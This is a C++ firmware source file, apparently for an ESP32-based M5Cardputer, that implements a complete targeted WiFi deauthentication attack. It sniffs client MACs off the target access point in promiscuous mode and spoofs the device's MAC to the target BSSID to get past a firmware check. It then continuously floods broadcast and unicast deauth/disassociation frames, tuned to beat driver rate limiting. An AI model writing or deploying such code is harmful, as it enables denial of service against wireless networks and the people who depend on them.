/*
 * wifi_deauth — targeted deauth against a specific BSSID.
 *
 * Two paths in:
 *   1. Fresh entry: user types the BSSID (AA:BB:CC:DD:EE:FF) and channel
 *   2. From WiFi scan: g_last_selected_ap is pre-filled, user just hits ENTER
 *
 * Attack pipeline (per iteration):
 *   - channel-lock to the target
 *   - passively snoop data frames to harvest STA MACs talking to the BSSID
 *   - fire a broadcast deauth+disassoc pair (kicks everyone)
 *   - fire unicast deauth+disassoc pairs to each harvested STA
 *   - repeat
 *
 * This mirrors aircrack-ng `--deauth 64`: alternating broadcast / unicast
 * improves kick rate. Sequence numbers increment per frame so modern
 * client drivers don't silently rate-limit us as duplicate mgmt traffic.
 *
 * ESC stops the attack. SPACE pauses and can resume.
 *
 * NOTE: Protected Management Frames (802.11w / WPA3 / WPA2-Enterprise)
 * cryptographically sign deauth/disassoc. This attack cannot kick PMF
 * clients — we warn the user at start and let them proceed for logging
 * purposes if they want to verify PMF is actually enabled.
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "sfx.h"
#include "wifi_types.h"
#include "wifi_deauth_frame.h"
#include <WiFi.h>
#include <esp_wifi.h>

#define MAX_LEARNED_CLIENTS 16

static volatile bool     s_running = false;
static volatile uint32_t s_sent    = 0;
static volatile uint32_t s_errs    = 0;
static uint8_t           s_target[6];
static uint8_t           s_channel;
static uint16_t          s_seq = 0;

/* Learned client table — populated by the promisc sniffer, read by
 * deauth_task. Dual-core safe via spinlock. */
static portMUX_TYPE s_cli_mux = portMUX_INITIALIZER_UNLOCKED;
static uint8_t      s_learned[MAX_LEARNED_CLIENTS][6];
static volatile int s_learned_n = 0;

static void cli_add(const uint8_t *mac)
{
    /* Reject broadcast / multicast / the BSSID itself. */
    if (mac[0] & 0x01) return;
    if (!memcmp(mac, s_target, 6)) return;

    portENTER_CRITICAL(&s_cli_mux);
    for (int i = 0; i < s_learned_n; ++i) {
        if (!memcmp(s_learned[i], mac, 6)) {
            portEXIT_CRITICAL(&s_cli_mux);
            return;
        }
    }
    if (s_learned_n < MAX_LEARNED_CLIENTS) {
        memcpy(s_learned[s_learned_n++], mac, 6);
    }
    portEXIT_CRITICAL(&s_cli_mux);
}

/* Sniff data frames to harvest clients associated with the target. */
static void sniff_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (pkt->rx_ctrl.sig_len < 24) return;
    const uint8_t *p = pkt->payload;

    uint8_t fc = p[1];
    uint8_t from_ds = (fc >> 1) & 1;
    uint8_t to_ds   = (fc)      & 1;

    const uint8_t *bssid;
    const uint8_t *sta;
    if (to_ds && !from_ds)       { bssid = p + 4;  sta = p + 10; }
    else if (from_ds && !to_ds)  { bssid = p + 10; sta = p + 4;  }
    else return;

    if (memcmp(bssid, s_target, 6) != 0) return;
    cli_add(sta);
}

static void deauth_task(void *)
{
    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);

    while (s_running) {
        /* 1. Broadcast burst — 16 pairs = 32 frames kicks everyone who
         *    isn't PMF-protected. */
        for (int i = 0; i < 16 && s_running; ++i) {
            int ok = wifi_deauth_broadcast(s_target, &s_seq);
            s_sent += ok;
            s_errs += (2 - ok);
            delay(3);
        }

        /* 2. Unicast to each learned client — snapshot under lock to
         *    minimize critical-section time. */
        uint8_t snap[MAX_LEARNED_CLIENTS][6];
        int n;
        portENTER_CRITICAL(&s_cli_mux);
        n = s_learned_n;
        if (n > MAX_LEARNED_CLIENTS) n = MAX_LEARNED_CLIENTS;
        memcpy(snap, (const void *)s_learned, n * 6);
        portEXIT_CRITICAL(&s_cli_mux);

        for (int c = 0; c < n && s_running; ++c) {
            /* 4 pairs per client per round = 8 frames. */
            for (int i = 0; i < 4 && s_running; ++i) {
                int ok = wifi_deauth_pair(snap[c], s_target, &s_seq);
                s_sent += ok;
                s_errs += (2 - ok);
                delay(3);
            }
        }

        /* If no clients learned yet, don't spin hot — let the sniffer
         * breathe. Still hammering broadcast above, so this just throttles
         * total airtime. */
        if (n == 0) delay(30);
    }
    vTaskDelete(nullptr);
}

static bool parse_mac(const char *s, uint8_t out[6])
{
    int v[6];
    int n = sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]);
    if (n != 6) return false;
    for (int i = 0; i < 6; ++i) {
        if (v[i] < 0 || v[i] > 0xFF) return false;
        out[i] = (uint8_t)v[i];
    }
    return true;
}

static bool collect_target(uint8_t *auth_out)
{
    if (g_last_selected_valid) {
        memcpy(s_target, g_last_selected_ap.bssid, 6);
        s_channel = g_last_selected_ap.channel ? g_last_selected_ap.channel : 1;
        if (auth_out) *auth_out = g_last_selected_ap.auth;
        return true;
    }
    char mac_buf[24];
    if (!input_line("Target BSSID:", mac_buf, sizeof(mac_buf))) return false;
    if (!parse_mac(mac_buf, s_target)) {
        ui_toast("invalid MAC", T_BAD, 1000);
        return false;
    }
    char ch_buf[6];
    if (!input_line("Channel (1-13):", ch_buf, sizeof(ch_buf))) return false;
    int ch = atoi(ch_buf);
    if (ch < 1 || ch > 13) {
        ui_toast("invalid channel", T_BAD, 1000);
        return false;
    }
    s_channel = (uint8_t)ch;
    if (auth_out) *auth_out = 0;  /* unknown */
    return true;
}

/* Returns true if user wants to proceed despite PMF, false to abort. */
static bool pmf_warning(void)
{
    auto &d = M5Cardputer.Display;
    ui_clear_body();
    d.setTextColor(T_WARN, T_BG);
    d.setCursor(4, BODY_Y + 4); d.print("PMF / 802.11w warning");
    d.drawFastHLine(4, BODY_Y + 14, SCR_W - 8, T_WARN);
    d.setTextColor(T_FG, T_BG);
    d.setCursor(4, BODY_Y + 20); d.print("target uses WPA3 or");
    d.setCursor(4, BODY_Y + 30); d.print("WPA2-Enterprise.");
    d.setCursor(4, BODY_Y + 44); d.print("deauth will be dropped");
    d.setCursor(4, BODY_Y + 54); d.print("cryptographically.");
    d.setTextColor(T_DIM, T_BG);
    d.setCursor(4, BODY_Y + 70); d.print("ENTER = proceed anyway");
    d.setCursor(4, BODY_Y + 80); d.print("ESC   = back");
    ui_draw_footer("PMF warn");
    while (true) {
        uint16_t k = input_poll();
        if (k == PK_ENTER) return true;
        if (k == PK_ESC)   return false;
        delay(20);
    }
}

void feat_wifi_deauth(void)
{
    radio_switch(RADIO_WIFI);
    WiFi.mode(WIFI_STA);

    s_sent = 0;
    s_errs = 0;
    s_seq = (uint16_t)(esp_random() & 0x0FFF);  /* randomize starting seq */
    s_learned_n = 0;
    s_running = false;

    uint8_t auth = 0;
    if (!collect_target(&auth)) {
        return;
    }

    if (wifi_auth_has_pmf(auth)) {
        if (!pmf_warning()) return;
    }

    /* Spoof our STA MAC to match the target BSSID so esp_wifi_80211_tx
     * passes the stock ESP-IDF blob's `ieee80211_raw_frame_sanity_check`
     * (rejects any frame whose addr2 doesn't match the interface's MAC).
     *
     * Critical: esp_wifi_set_mac() must be called while WiFi is STOPPED,
     * not merely initialized. esp_wifi_stop -> set_mac -> esp_wifi_start. */
    uint8_t s_saved_mac[6];
    esp_wifi_get_mac(WIFI_IF_STA, s_saved_mac);
    esp_wifi_stop();
    esp_err_t mac_rc = esp_wifi_set_mac(WIFI_IF_STA, s_target);
    esp_wifi_start();
    Serial.printf("[deauth] set_mac %02X:%02X:%02X:%02X:%02X:%02X rc=%d\n",
                  s_target[0], s_target[1], s_target[2],
                  s_target[3], s_target[4], s_target[5], (int)mac_rc);

    /* Start promiscuous sniffer + inject. */
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(sniff_cb);
    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);

    s_running = true;
    xTaskCreate(deauth_task, "deauth", 3072, nullptr, 4, nullptr);
    sfx_deauth_burst();

    ui_clear_body();
    ui_draw_footer("ESC=stop  SPACE=pause");
    auto &d = M5Cardputer.Display;

    uint32_t last = 0;
    uint32_t last_sent = 0;
    bool paused = false;
    bool state_changed = true;
    while (true) {
        uint32_t now = millis();
        if (now - last > 250) {
            last = now;
            ui_clear_body();
            ui_dashboard_chrome(">> DEAUTH <<", state_changed);
            state_changed = false;

            d.setTextColor(T_FG, T_BG);
            d.setCursor(4, BODY_Y + 16);
            d.printf("%02X:%02X:%02X:%02X:%02X:%02X",
                     s_target[0], s_target[1], s_target[2],
                     s_target[3], s_target[4], s_target[5]);
            d.setTextColor(T_DIM, T_BG);
            d.setCursor(4, BODY_Y + 26); d.printf("channel %u", s_channel);

            uint32_t fps = (s_sent - last_sent) * 4;
            last_sent = s_sent;
            d.setTextColor(paused ? T_WARN : T_ACCENT, T_BG);
            d.setCursor(4, BODY_Y + 40);
            d.printf("frames: %lu", (unsigned long)s_sent);
            d.setCursor(4, BODY_Y + 50);
            d.printf("rate  : %lu/s%s", (unsigned long)fps, paused ? " (PAUSED)" : "");

            d.setTextColor(s_errs > 0 ? T_BAD : T_DIM, T_BG);
            d.setCursor(4, BODY_Y + 60);
            d.printf("drops : %lu  sta:%d", (unsigned long)s_errs, s_learned_n);

            ui_freq_bars(SCR_W - 70, BODY_Y + 16, 4, 36);
            ui_draw_status(radio_name(), paused ? "paused" : "flooding");
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) { s_running = false; break; }
        if (k == PK_SPACE) {
            paused = !paused;
            state_changed = true;
            if (paused) { s_running = false; }
            else {
                /* Give the old task a window to notice s_running=false and
                 * exit its inner delay(3) loop before spawning a fresh one,
                 * so we don't briefly double-run deauth_task on both cores. */
                delay(30);
                s_running = true;
                xTaskCreate(deauth_task, "deauth", 3072, nullptr, 4, nullptr);
            }
        }
    }

    s_running = false;
    delay(150);
    esp_wifi_set_promiscuous(false);
    /* Restore real MAC — stop/set/start cycle required. */
    esp_wifi_stop();
    esp_wifi_set_mac(WIFI_IF_STA, s_saved_mac);
    esp_wifi_start();
}
